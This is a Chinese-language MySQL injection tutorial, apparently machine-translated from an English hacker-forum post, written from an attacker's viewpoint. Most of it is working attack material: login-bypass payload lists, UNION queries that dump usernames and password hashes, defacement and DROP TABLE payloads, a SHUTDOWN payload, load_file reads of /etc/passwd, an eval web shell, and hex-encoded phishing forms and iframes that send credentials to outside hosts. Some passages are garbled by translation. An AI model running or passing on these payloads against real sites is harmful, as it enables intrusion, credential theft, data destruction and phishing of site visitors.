### 作者：Passerby2

###
原文来自：[史上最完整的MySQL注入](https://bbs.ichunqiu.com/thread-44483-1-1.html?from=beef)

免责声明：本教程仅用于教育目的，以保护您自己的SQL注释代码。 在阅读本教程后，您必须对任何行动承担全部责任。

* * *

## 0x00 ~ 背景

这篇文章题目为“为新手完成MySQL注入”，它旨在提供专门针对MySQL数据库的SQL注入的完整知识和工作方式，除了堆栈查询部分。
这里的第一个贡献......

表中的内容

  * 介绍

  * 什么是数据库？

  * 什么是SQL注入？

  * 绕过登录

  * 访问秘密数据

    * 检查漏洞

    * 找到列数

    * 解决脆弱的部分

    * 寻找MySQL版本

    * MySQL 5或以上版本的注入

    * MySQL 4注入
  * 修改网站内容

  * 关闭MySQL服务器

  * Loadfile

  * MySQL Root

  * 主要的MySQL命令

  * 完成注射教程

  * 更新

    * 绕过登录高级

    * RF注入SQL注入

    * URL欺骗网络钓鱼

    * 头

    * Cookie
  * 结束

## 0x01 ~ 介绍

大家好，对于那些不了解我的人我是他们的噩梦=）..在本教程中，我将以新手视角展示MySQL中臭名昭著的注入，以便所有新手都能成为成功的SQL注入器。
目的，一定要检查PHP和MySQL中的各种函数和各种各样的网站，它们会对你有很大的帮助...也不要苛刻我是否有任何语法错误的教程因为英语不是我的母语（我是
来自土星环）。 现在让我们开始SQL注入的演练。

## 0x02 ~ 什么是数据库

这只是一般的信息..数据库是存储数据集合的应用程序。 数据库提供各种API，用于创建，访问和管理它所拥有的数据。
并且数据库（DB）服务器可以与我们的Web开发集成，以便我们可以从数据库中获取我们想要的东西而没有太多困难。
DB可能包含各种关键信息，如用户名，密码，信用等。 因此，需要保护数据库，但运行的许多数据库服务器由于其漏洞或编程处理不当而不安全。
仅举几例DB服务器，MySQL（开源），MSSQL，MS-ACCESS，Oracle，Postgre SQL（开源），SQLite等。

## 0x03 ~ 什么是Sql注入?

SQL注入可能是目前互联网上存在的最丰富的编程缺陷。 这是未经授权的人可以访问各种关键和私人数据的漏洞。
SQL注入不是Web或数据库服务器中的缺陷，而是由于编程实践较差且缺乏经验而导致的。 它是从远程位置执行的最致命和最容易的攻击之一。

在SQL注入中，我们使用各种命令与DB服务器交互，并从中获取各种数据。 在本教程中，我将讨论SQL注入的3个方面，即绕过登录，访问机密数据和修改页面内容。
因此，让我们在真正的演练中前进......

## ＃0x04 ~ 绕过登录

假设一个站点有一个登录表单，只允许注册用户进入该站点。 现在，假设你想绕过登录并以合法用户身份进入网站。
如果程序员没有正确清理登录脚本，您可能很幸运能够进入该站点。 通过与DB服务器交互，你可能无需知道真实用户名和真实密码即可登录该站点。
那么，这不就是SQL注入的美感吗？

让我们看一个例子，其中用户名admin和密码sam207可以登录到该站点。 假设，对此的SQL查询执行如下：  
HTML代码：  
SELECT USER from database WHERE username ='admin'AND password ='xenu'  
如果上面的SELECT命令评估为true，则将授予用户访问该站点的权限。 想想如果没有清理脚本我们可以做些什么。 这为黑客获取非法访问网站打开了一扇大门。

在此示例中，攻击者可以在登录表单中输入以下用户数据：

    
    
    username:a or 1=1--    password:blank

所以，这会使我们的查询为：

    
    
    <?php
    SELECT USER from database WHERE username='a' or 1=1-- AND password=''  

请注意 - 是注释运算符，其后的任何内容都将被忽略为注释。 存在另一个注释运算符，它是/ *。

所以我们的上述查询变为：

    
    
    <?php
    SELECT USER from database WHERE username='a' or 1=1  

现在，即使没有名为“a”的用户，此查询也会计算为true，因为1 = 1始终为true，并且当其中一个查询为true时，使用OR会使查询返回true。
这样就可以访问站点管理面板。

可以有各种其他用户名和密码组合来与易受攻击的网站一起玩。 您可以为站点登录创建自己的新组合。

很少有这样的组合：

    
    
    username:' or 1='1        password:' or 1='1
    username:' or '1'='1'    password:' or '1'='1'
    username:or 1=1        password:or 1=1

这是基本没关系让我们现在假设不同的查询和不同的注入。

    
    
    <?php
    select username,pass from users where username=('$username') and password=('$passwrd') limit 0,1;  

这样的组合是：

    
    
    ') or true--    ') or ('')=('
    ') or 1--    ') or ('x')=('

PHP代码：

    
    
    <?php
    select username,pass from users where username="$username" and password="$passwrd" limit 0,1;  

这样的组合是：

    
    
    " or true--    " or ""="
    " or 1--    " or "x"="

PHP代码：

    
    
    <?php
    select username,pass from users where username=("$username") and password=("$passwrd") limit 0,1;  

这样的组合是：

    
    
    ") or true--    ") or ("")=("
    ") or 1--    ") or ("x")=("

PHP代码：

    
    
    <?php
    select username,pass from users where username=(('$username')) and password=(('$passwrd')) limit 0,1;  

这样的组合是：

    
    
    ')) or true--    ')) or ((''))=(('
    ')) or 1--    ')) or (('x'))=(('

另一种有效载重：

    
    
    '-'
    ' '
    '&'
    '^'
    '*'
    ' or ''-'
    ' or '' '
    ' or ''&'
    ' or ''^'
    ' or ''*'
    "-"
    " "
    "&"
    "^"
    "*"
    " or ""-"
    " or "" "
    " or ""&"
    " or ""^"
    " or ""*"
    or true--    " or true--    ' or true--    ") or true--    ') or true--    ' or 'x'='x
    ') or ('x')=('x
    ')) or (('x'))=(('x
    " or "x"="x
    ") or ("x")=("x
    ")) or (("x"))=(("x

这就是绕过登录。

## 0x05 ~ 获得秘密的数据

SQL注入本质上不是为了绕过登录，而是用于访问数据库服务器中的敏感和秘密数据。 这部分很长，所以我将在小节中讨论。

## ＃0x05.a~检查漏洞

假设你有一个网站：

    
    
    <?php
    site.com/article.php?id=5

现在要检查它是否容易受到攻击，你只需添加'到底，即分配了id变量。

所以，它是：

    
    
    <?php
    site.com/article.php?id=5'

现在，如果站点不易受攻击，则会过滤并正常加载页面。但是，如果它不过滤查询字符串，它将给出如下错误：“第5行的Article.php中的'5''MySQL语法错误。”或者是错误，说我们检查正确的MySQL版本或MySQL
Fetch错误或有时只是空白页面。 错误可能是任何形式。 因此，它确保该网站易受攻击。

只是使用'可能不是肯定的测试; 所以你可以尝试不同的东西，比如：

    
    
    <?php
    site.com/article.php?id=5+union+select+1--  

如果你得到这个错误，你再次知道它的弱点...只是尝试不同的东西..

## ＃0x05.b~查找列数

所以，现在是时候找到列数了。 为此，我们将使用'order by'直到我们收到错误。

也就是说，我们将URL查询设为：

    
    
    <?php
    site.com/article.php?id=5+order+by+1/*  

这没有给出错误。

现在，我确实把它增加到2：

    
    
    <?php
    site.com/article.php?id=5+order+by+2/*  

仍然没有错误  
所以，我们需要增加，直到我们得到错误。

在我的例子中，当我输入值3时出现错误，即：

    
    
    <?php
    site.com/article.php?id=5+order+by+3/*  

这反馈给了我错误。

因此，这意味着当前表中有2列（3 - 1 = 2）。 这就是我们找到列数的方式。

## ＃0x05.c~解决弱势部分

现在，我们需要使用union语句并找到我们可以替换的列，以便在页面上查看秘密数据。

首先让我们设计一个不会出错的union语句。这就像这样：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+null/*

这会出错，因为我们的查询需要在那里再有一个null。而且null不会导致任何类型转换错误，因为它只是null。

因此，对于我们的注射，它变成：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+null,null/*

为此我们做：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+1,2/*

现在我们将看到页面上的数字。 我的意思是，页面上可以看到1或2或1和2。
请注意，数字可以显示在页面标题中的任何位置，有时甚至可以显示在源代码中的隐藏标记中。因此，这意味着我们可以使用命令替换数字以显示数据库保存的私有数据。

在我的例子中，页面上显示1。 这意味着，我应该用我的东西替换1继续进行。 得到它了？ 所以让我们前进吧。

快速注意：有时可能无法显示数字，因此您很难找到可用于窃取数据的列。因此，在这种情况下，您可以尝试以下内容：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+xenu,null/*

或者

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+null,xenu/*  

如果xenu显示在页面的某个位置，你可以进一步注射替换文本部分......在这里，我保留文本而不是整数来检查是否显示文本...另外，一定要检查源，因为有时他们
可能在一些隐藏的标签中..

## ＃0x05.d~查找MySQL版本

对于我们的注入，有必要找到MySQL版本，因为如果它是5，我们的工作变得容易多了。 要检查版本，有一个函数@@ version或version（）。

那么，我们所做的是用@@版替换1（这是可替换的部分），即我们如下所示：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+@@version,2/*  

或者

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+version(),2/*  

因此，这将返回在服务器上运行的MySQL版本。

但是，有时你可能会遇到上述查询错误。 如果是这种情况，请使用unhex（hex（））函数，如下所示：

    
    
    <?php
    site.com/article.php?id=UNION+ALL+SELECT+unhex(hex(@@version)),2/*  

请记住，如果你必须在这里使用unhex（hex（））函数，你也必须在以后的注入过程中使用这个函数。

@@版本会给你这个版本。 它可以是4（或更低）或5和更高。 我现在将分别讨论版本5和4的注射过程，正如我之前所说，版本5使我们可以轻松执行注射。

注意：此外，您可以通过以下方式检查用户，数据库等。

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+user(),2/*
    site.com/article.php?id=5+UNION+ALL+SELECT+database(),2/*  

## ＃0x05.e~MySQL 5或以上注入

在这里，我将向您展示如何访问运行MySQL 5或更高版本的服务器中的数据。

你使用url参数中的@@版本得到MySQL版本5.0.27标准。 版本5中的MySQL有一个名为information_schema的有用函数。
这是保存有关DB服务器中存在的表和列的信息的表。 也就是说，它包含站点的所有表和列的名称。

要获取表格列表，我们使用：

    
    
    table_name from information_schema.tables

要获取列列表，我们使用：

    
    
    column_name from information_schema.columns

因此，我们在示例中获取表列表的查询将是：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+table_name,2+FROM+information_schema.tables/*  

是的，如果您在查找版本时必须使用unhex（hex（）），则必须执行以下操作：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+unhex(hex(table_name)),2+FROM+information_schema.tables/*

这将列出DB中存在的所有表。 出于我们的目的，我们将搜索包含用户和密码信息的表。 所以我们用这些信息查看可能的表格。
你甚至可以写下表名以供进一步参考和使用。 对于我的示例，我将使用tbluser作为包含用户和密码的表。

同样，要获取列列表，我们将查询为：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+column_name,2+FROM information_schema.columns/*  

这将返回数据库服务器中存在的所有列。 现在从这个列表中，我们将查找用户名和密码的可能列。 对于我的注射，有两列保存这些信息。 它们分别是用户名和密码。
这就是我想要的专栏。 你必须搜索并检查列，直到你没有错误。

或者，要查找特定表中的列，您可以执行以下操作：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+column_name,2+FROM+information_schema.columns+WHERE+table_name='tbluser'  

这将显示表tbluser中的列。 但这可能无法始终基于PHP.INI，所以六角形。

让我告诉你我是如何知道上面两列属于表tbluser的。 现在让我展示如何显示存储在DB中的用户名和密码。

有一个名为concat（）的函数允许我连接两列并在页面上显示。 我也将以十六进制形式使用分号。 它的十六进制值是0x3a（在开始时为零而不是字母o。）

我做的是：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+concat(username,0x3a,password),2+FROM+tbluser/*  

这给了我如下的用户名和密码：

    
    
    admin:9F14974D57DE204E37C11AEAC3EE4940

这里密码是哈希的，在这种情况下，它是MD5。 现在你需要得到像hashcat，passwordpro（等）一样的哈希破解程序并破解哈希。
哈希值可能与SHA1，MD5等不同。或者有时可能会在页面上显示明文密码。 在这种情况下，当我破解时，我得到密码为sam207。

现在你进入管理员登录页面并以管理员身份登录。 然后你可以做任何你想做的事。 这就是MySQL版本5的全部内容。

## ＃0x05.f~MySQL版本4注入

现在说你的受害者有MySQL版本4.那么你将无法获得MySQL版本5中的表名和列名，因为它缺乏对information_schema.tables和information_schema.columns的支持。

所以现在你必须猜测表名和列名，直到你没有得到错误。
此外，如果MySQL版本低于5，您可能必须依赖显示的运气和错误消息。有时错误将为您提供表名称和列名称，并让您有一些想法猜测正确的表和列名称
..说，错误报告错误中的xenu_article ..所以，你知道xenu_是表名中使用的前缀...

无论如何，让我们去MySQL版本4注入...

例如，你会这样做：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+1,2+FROM+user/*  

在这里，我猜测表名为user。 但是这给了我错误，因为DB上没有名称user的表。 现在我继续猜测表名，直到我没有得到错误。

当我将表名作为tbluser时，页面正常加载。 所以我开始知道表tbluser存在。

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+1,2+FROM+tbluser/*  

页面正常加载。 现在再次你必须猜测tbluser表中存在的列名。

我做了类似下面的事情：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+user_name,2+FRO+tbluser/*

//这给了我错误，所以没有这个名字的专栏。

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+username,2+FROM+tbluser/*      

//它正常加载页面以及表中的用户名。

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+pass,2+FROM tbluser/*

//它的错误再次表明tbluser中不存在列传递。

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+password,2+FROM+tbluser/*     

//通常使用密码哈希（或明文密码）加载的页面。

现在你可以这样做：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+concat(username,0x3a,password),2+FROM+tbluser/*  

这反馈给我：

    
    
    admin:9F14974D57DE204E37C11AEAC3EE4940

现在我只需要登录该网站并做任何我想做的事情。

您可能尝试的几个表名称是：user（s），table_user（s），tbluser（s），tbladmin（s），admin（s），members（等）等。  
如前所述，请务必查看错误，因为有时他们会为我们提供表名和列名错误...

如果数据库成立，你可以尝试这些方法以获得各种数据，例如信用卡号，社会保险号等等。 您需要做的就是找出列并将它们显示在易受攻击的页面上。
这就是用于访问秘密数据的注入。

## ＃0x06~修改网站内容

有时候，你会发现易受攻击的网站，并且需要知道，但是管理员登录可能不存在，或者某些IP范围是可访问的。 即使在该上下文中，您也可以使用一些kewl
SQL命令来修改站点内容。 我没有看到很多文章解决这个问题，所以我想把它包含在这里。

在这里，我将基本上讨论一些可能用于更改网站内容的SQL命令。 Therse命令是MySQL的主力并且在执行时是致命的。 但堆叠查询不适用于MySQL。

首先让我列出这些命令：

UPDATE：它用于编辑数据库中已有的信息而不删除任何行。

DELETE：用于删除一个或多个字段的内容。

DROP：用于完全删除表及其所有相关数据。

现在，如果网站允许我们与db进行交互而没有清理和适当的权限，你可能已经发现这些命令非常具有破坏性。

命令用法：

UPDATE：我们易受攻击的页面是：

    
    
    <?php
    site.com/article.php?id=5  

让我们说查询是：

    
    
    <?php
    SELECT title,data,author FROM article WHERE id=5

虽然实际上我们不知道上面的查询，但我们可以找到前面讨论过的表和列名。

所以我们会这样做：

    
    
    <?php
    site.com/article.php?id=5+UPDATE+article+SET+title='Hacked By Xenu for R00TW0RM C0MMUNITY'/*

或者，你可以做：

    
    
    <?php
    site.com/article.php?id=5+UPDATE+article+SET+title='Hacked By r00tw0rm',data='Ur site has zero security',author='Xenu'/*

通过执行第一个查询，我们在表格文章中将标题值设置为“Hacked By
r00tw0rm”，而在第二个查询中，我们更新了表格文章中的所有三个字段title，data和author。

有时，您可能想要更改id = 5的特定页面。 为此，你会这样做：

    
    
    <?php
    site.com/article.php?id=5+UPDATE+article+SET+title='value 1',data='value 2',author='value 3'+WHERE+id=5/*  

DELETE：如前所述，这将从数据库服务器中永久删除一个或多个字段的内容。

语法是：

    
    
    <?php
    site.com/article.php?id=5+DELETE+title,data,author+FROM+article/*

或者，如果要从id = 5中删除这些字段，您将执行以下操作：

    
    
    <?php
    site.com/article.php?id=5+DELETE+title,data,author+FROM+article+WHERE+id=5/*  

DROP：这是你可以使用的另一个致命的命令。 有了这个，你可以删除一个表及其所有相关数据。  
为此，我们将URL设为：

    
    
    <?php
    site.com/article.php?id=5+DROP+TABLE+article/*

这将删除表格文章及其所有内容。

最后，我想谈谈';'。

虽然我没有在我的教程中使用它，但你可以使用它来结束你的第一个查询并启动另一个查询。

这个 ; 可以保留在我们的第一个查询的末尾，以便我们可以在它之后开始新的查询。

## ＃0x07~关闭MySQL服务器

这就像执行服务器一样，因为它会使合法用户或网站访问者无法使用MySQL资源......为此，您将使用：

    
    
    SHUTDOWN WITH NOWAIT;

那么，你会制作一个执行上述命令的查询......

例如，在我的情况下，我会做以下事情：

    
    
    <?php
    site.com/article.php?id=5+SHUTDOWN+WITH+NOWAIT;  

哇，太疯狂了！ MySQL服务器关闭...这将阻止合法用户和网站访问者使用或查看MySQL资源

## ＃0x08~Loadfile

MySQL有一个名为load_file的函数，您可以再次使用它来获益。我还没有看到很多网站可以使用这个函数...我认为我们应该拥有MySQL
root权限....此外，魔术引号 应该关闭这个...但有一种方法可以超越魔术引号...
load_file可用于加载服务器的某些文件，如.htaccess，.htpasswd等..还有/ etc等密码文件 / passwd等。

做类似下面的事情：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+load_file('etc/passwd'),2/*

但有时候，你必须对部件进行hex并执行以下操作：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+load_file(0x272F6574632F70617373776427)  

我已经hex了......现在，如果我们幸运的话，脚本将在结果中回显/ etc / passwd。

进一步阅读：<https://greysec.net/showthread.php?tid=211>

## ＃0x08~MySQL Root

如果MySQL版本为5或更高版本，我们可能会获得MySQL
root权限，这对我们来说也会有所帮助。来自版本5的MySQL服务器有一个名为mysql.user的表，其中包含用于登录的哈希和用户名...
它位于MySQL数据库的用户表中，随MySQL的每次安装一起提供。

为此，您将：

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+concat(username,x3a,password),2+from+mysql.user/*  

现在你将获得用户名和哈希..哈希是mysqlsha1 ...快速注意：JTR不会破解它..但是insidepro.com有一个要做它..

## ＃0x09~主要MySQL命令

下面，我将列出一些可能对您有所帮助的主要MySQL命令...通过在您的计算机中设置MySQL服务器以不同的方式与它们一起玩。

这里的所有命令都是从h4cky0u的帖子中复制粘贴的，这部分的功劳归于原作者..这是我自己写的唯一部分..我可以拥有但是因为有更好的一部分，我
我想把相同的部分放在这里..感谢在h4cky0u网站上发布此内容的人...以及此部分的全部学分给他/她。

注释：

ABORT - 中止当前转换

ALTER DATABASE - 更改数据库

ALTER GROUP - 将用户添加到组或从组中删除用户

ALTER TABLE - 更改表的定义

ALTER TRIGGER - 更改触发器的定义

ALTER USER - 更改数据库用户帐户

ANALYZE - 收集有关数据库的统计信息

BEGIN - 启动交易冻结

CHECKPOINT - 强制事务日志检查点

CLOSE - 关闭光标

CLUSTER - 根据索引对表进行聚类

COMMENT - 定义或更改对象的注释

COMMIT - 提交当前事务

COPY - 在文件和表之间复制数据

CREATE AGGREGATE - 定义一个新的聚合函数

CREATE CAST - 定义用户定义的强制转换

CREATE CONSTRAINT TRIGGER - 定义一个新的约束触发器

CREATE CONVERSION - 定义用户定义的转换

CREATE DATABASE - 创建一个新数据库

CREATE DOMAIN - 定义一个新域

CREATE FUNCTION - 定义一个新功能

CREATE GROUP - 定义新用户组

CREATE INDEX - 定义一个新索引

CREATE LANGUAGE - 定义一种新的过程语言

CREATE OPERATOR - 定义一个新的运算符

CREATE OPERATOR CLASS - 为索引定义一个新的运算符类

CREATE RULE - 定义新的重写规则

CREATE SCHEMA - 定义新架构

CREATE SEQUENCE - 定义一个新的序列生成器

CREATE TABLE - 定义一个新表

CREATE TABLE AS - 根据查询结果创建新表

CREATE TRIGGER - 定义一个新的触发器

CREATE TYPE - 定义新的数据类型

CREATE USER - 定义新的数据库用户帐户

CERATE VIEW - 定义新视图

DEALLOCATE - 删除准备好的查询

DECLARE - 定义游标

DELETE - 删除表的行

DROP AGGREGATE - 删除用户定义的聚合函数

DROP CAST - 删除用户定义的强制转换

DROP CONVERSION - 删除用户定义的转换

DROP DATABASE - 删除数据库

DROP DOMAIN - 删除用户定义的域

DROP FUNCTION - 删除用户定义的函数

DROP GROUP - 删除用户组

DROP INDEX - 删除索引

DROP LANGUAGE - 删除用户定义的过程语言

DROP OPERATOR - 删除用户定义的运算符

DROP OPERATOR CLASS - 删除用户定义的运算符类

DROP RULE - 删除重写规则

DROP SCHEMA - 删除架构

DROP SEQUENCE - 删除序列

DROP TABLE - 删除表

DROP TRIGGER - 删除触发器

DROP TYPE - 删除用户定义的数据类型

DROP USER - 删除数据库用户帐户

DROP VIEW - 删除视图

END - 提交当前事务

EXECUTE - 执行准备好的查询

EXPLAIN - 显示语句的执行计划

FETCH - 使用游标从表中检索行

GRANT - 定义访问权限

INSERT - 在表中创建新行

LISTEN - 收听通知

LOAD - 加载或重新加载共享库文件

LOCK - 显式锁定表

MOVE - 将光标放在表格的指定行上

NOTIFY - 生成通知

PREPARE - 创建准备好的查询

REINDEX - 重建损坏的索引

RESET - 将运行时参数的值恢复为默认值

REVOKE - 删除访问权限

ROLLBACK - 中止当前事务

SELECT - 从表或视图中检索行

SELECT INTO - 根据查询结果创建一个新表

SET - 更改运行时参数

SET CONSTRAINTS - 设置当前事务的约束模式

SET SESSION AUTHORIZATION - 设置会话用户标识符和当前会话的当前用户标识符

SET TRANSACTION - 设置当前事务的特征

SHOW - 显示运行时参数的值

START TRANSACTION - 启动交易冻结

TRUNCATE - 清空一张桌子

UNLISTEN - 停止收听通知

UPDATE - 更新表的行

VACUUM - 垃圾收集并可选地分析数据库

## ＃0x09~完成注射教程

我知道我错过了一些东西，比如outfile，WHERE子句，盲注等...如果我有时间，我会尝试用这些来更新教程..对于所有sql注入器，请大胆思考..＆
hexing是sql注入中的一个重要部分。有时用普通方法无法完成的事情可以通过使用hex部分完成..并且一定要尝试使用char（），hex（）函数。
这些，您可以绕过服务器上的魔术引号。再次，在UNION语句中，您可能会尝试使用有时对您有帮助的XSS。

    
    
    <?php
    site.com/article.php?id=5+UNION+ALL+SELECT+<script>
    alert("XSS via SQL injection");
    </script>,2/*  

再次在上面的注入中，您可能需要对javascript部分进行六进制以绕过魔术引号。

对于初学者和那些了解小事的人，您可以在本地主机中为您的apache服务器设置MySQL服务器并配置PHP，您可以尝试不同的东西。

在MySQL的命令行界面中，尝试下面列出的各种命令。尝试修改它们...这将有助于您提高MySQL命令知识。还试着看看PHP代码如何与MySQL服务器交互..例如，安装一些免费的论坛，如PHPBB，SMF等..或者一些内容管理系统，因为它可以通过两种方式帮助你。首先，你将学习PHP如何与MySQL交互..你可以检查MySQL文件夹中发生了什么变化后安装它们..如果我这样做会怎么样？或者那个？？
etc..etc ..其次，你可能能够找到它们中的bug
..比如rfi代码的某些部分或sql注入另一部分或者csrf注入等等。这会帮助你学习新东西，因为你们都知道练习能让人变得完美......

## ＃0x10~更新

我借此机会更新此complet文件undefined

## ＃0x10.a~绕过登录高级

我希望你喜欢阅读“Bypassing Logins”一章。 因此，现在是时候了解如何将某个易受攻击的登录表单的数据库转出。

    
    
    <?php
    select username,pass from users where username="$uname" and password="$passwrd" limit 0,1
    select username,pass from users where username='$uname' and password='$passwrd' limit 0,1  

代码：

    
    
    username : ' or (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) and ''='
    username : " or (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) and ""="
    username : ' or (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) --+
    username : " or (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) --+
    username : ' or (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) #
    username : " or (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) #
    username : ' or (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) --    username : " (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) --
您可以再次将密码字段留空。 现在让我们看看查询将传递什么。

    
    
    <?php
    select username,pass from users where username='' or (select 1 from (select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y)x) and ''='' and password='' limit 0,1  

## ＃0x10.b~SQL注入的RFI

如果您已阅读本文并了解RFI漏洞，则无需解释。 这很容易！

    
    
    <?php
    site.com/?param=1+union+select+'<?eval($_request[cmd]);?>'&cmd=passthru('ls');  

## ＃0x10.c~URLS欺骗性网络钓鱼

这次标题说明了我们将使用SQL注入漏洞利用URL欺骗进行网络钓鱼。 有三种方法

  * 注入HTML

  * 注入iFrame

  * 修改当前表格

我们将把有效负载注入SQL注入，并像在XSS中一样在网页上添加一些额外的代码。

首先，注入HTML。 为简单起见，我们将有效负载编码为十六进制。 对于有效载荷：

    
    
    <?php
    <form action=http://site.com/w0rm.php method="POST">
    Username : <input type="text" name="username"><br>
    Password :<input type="text" name="password">
    <input type="submit">
    </form>
    <iframe height=0 width=0>  

编码为十六进制：

    
    
    3c666f726d20616374696f6e3d687474703a2f2f736974652e636f6d2f7730726d2e706870206d65 74686f643d22504f5354223e0d0a557365726e616d65203a203c696e70757420747970653d227465 787422206e616d653d22757365726e616d65223e3c62723e0d0a50617373776f7264203a3c696e70 757420747970653d227465787422206e616d653d2270617373776f7264223e0d0a3c696e70757420 747970653d227375626d6974223e0d0a3c2f666f726d3e0d0a3c696672616d65206865696768743d 302077696474683d303e

在注入的SQL中注入Hex（有效载荷）。

注射iframe

例如：

    
    
    <?php
    <br><iframe src="http://site.com/virus.php" height=300 width=300 frameBorder="0" scrolling="no"></iframe>  

代码：

    
    
    3c62723e3c696672616d65207372633d22687474703a2f2f736974652e636f6d2f76697275732e70 687022206865696768743d3330302077696474683d333030206672616d65426f726465723d223022 207363726f6c6c696e673d226e6f223e3c2f696672616d653e,4,5--
PHP代码：

    
    
    <?php
    site.com/link.php?id=-1'+union+select+1,2,0x3c62723e3c696672616d65207372633d22687474703a2f2f736974652e6 36f6d2f76697275732e70687022206865696768743d3330302077696474683d333030206672616d6 5426f726465723d223022207363726f6c6c696e673d226e6f223e3c2f696672616d653e,4,5--  

更改当前表格

在这次攻击中，我们将在网站中注入javascript，将网站中当前登录页面的操作更改为我们的虚假登录页面链接。

    
    
    <?php
    <script>document.getElementsByTagName("form")[0].action="http://www.site.com/virus.php"</script>  

代码：

    
    
    3c7363726970743e646f63756d656e742e676574456c656d656e747342795461674e616d65282266 6f726d22295b305d2e616374696f6e3d22687474703a2f2f7777772e736974652e636f6d2f766972 75732e706870223c2f7363726970743e

PHP代码：

    
    
    <?php
    site.com/link.php?id=-1' union select 1,2,0x3c7363726970743e646f63756d656e742e676574456c656d656e747342795461674e6 16d652822666f726d22295b305d2e616374696f6e3d22687474703a2f2f7777772e736974652e636 f6d2f76697275732e706870223c2f7363726970743e,4,5--  

## ＃0x10.c~标题

HTTP查询字符串参数（GET）：URL中发送的输入参数。

HTTP正文参数（POST）：HTTP主体中发送的输入参数。

HTTP Cookie参数：HTTP cookie中发送的输入参数。

HTTP标头：应用程序使用的HTTP请求标头。

HTTP头字段是超文本传输​​协议（HTTP）中的请求和响应的消息头的组件。它们定义HTTP事务的操作参数。

Example: Request HTTP

Code:

GET / HTTP/1.1

Connection: Keep-Alive

Keep-Alive: 300

Accept:/

Host: host

Accept-Language: en-us

Accept-Encoding: gzip, deflate

User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US;

rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 ( .NET CLR 3.5.30729; .NET4.0E)

Cookie: guest_id=v1%3A1328019064; pid=v1%3A1328839311134

当存储在数据库中用于会话识别时，我们可以将HTTP
Cookie视为应该测试的第一个潜在HTTP变量。我们将在基于Cookie的SQL注入示例中看到下一个。还有与应用程序相关的其他HTTP标头。

X-Forwarded-For是一个HTTP头字段，被认为是事实上的标准，用于识别通过HTTP代理或负载均衡器连接到Web服务器的客户端的原始IP地址。

我们将在表单提交的基础上看到这个漏洞的一个例子。

    
    
    <?php     
    $req = mysql_query("SELECT user,password FROM admins WHERE user='".sanitize($_POST['user'])."' AND password='".md5($_POST['password'])."' AND ip_adr='".ip_adr()."'");  

由于sanitize（）方法，可以正确控制变量login。

    
    
    <?php
    1function sanitize($param){ if (is_numeric($param)) { return $param; } else { return mysql_real_escape_string($param); } }

让我们检查一下ip变量。 它正在分配ip_addr（）方法的输出。

    
    
    <?php
    function ip_adr() { if
    (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip_adr = $_SERVER['HTTP_X_FORWARDED_FOR']; } else { $ip_adr = $_SERVER["REMOTE_ADDR"]; } if (preg_match("#^[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}#",$ip_addr)) { return $ip_adr; } else { return $_SERVER["REMOTE_ADDR"]; } }  

显然，从HTTP头X_FORWARDED_FOR中检索IP地址。 稍后由preg_match控制，它验证此参数是否确实包含至少一个IP地址。
事实上，在SQL查询中使用其值之前，环境变量HTTP_X_FORWARDED_FOR未正确清理。 这可以通过将任意SQL代码注入此字段来运行任何SQL查询。

将此标头字段简单修改为：

    
    
    GET /index.php HTTP/1.1
    Host: [host]
    X_FORWARDED_FOR :127.0.0.1' or 1=1#
    [/php]
    will lead to bypass the authentication control.
    
    User agent is an HTTP header field gives the software program used by the original client. This is for statistical purposes and the tracing of protocol violations. It should be included. The first white space delimited word must be the software product name, with an optional slash and version designator.
    
    Not all applications are written to capture the user-agent data, but sometimes applications are designed to store such information (ex: shopping cart providers) to make use of it. In this case, it’s worth investigating the user-agent header for possible issues.
    
    HTTP query example:
    [code]
    GET /index.php HTTP/1.1
    Host: [host]
    User-Agent: aaa' or 1/*

Referer是另一个HTTP标头，一旦应用程序将其存储在数据库中而不对其进行清理，它可能容易受到[sql注入攻击](http://www.ichunqiu.com/courses/277)。
它是一个可选的头字段，允许客户端为服务器的好处指定从中获取请求中的URI的文档（或文档中的元素）的地址（URI）。
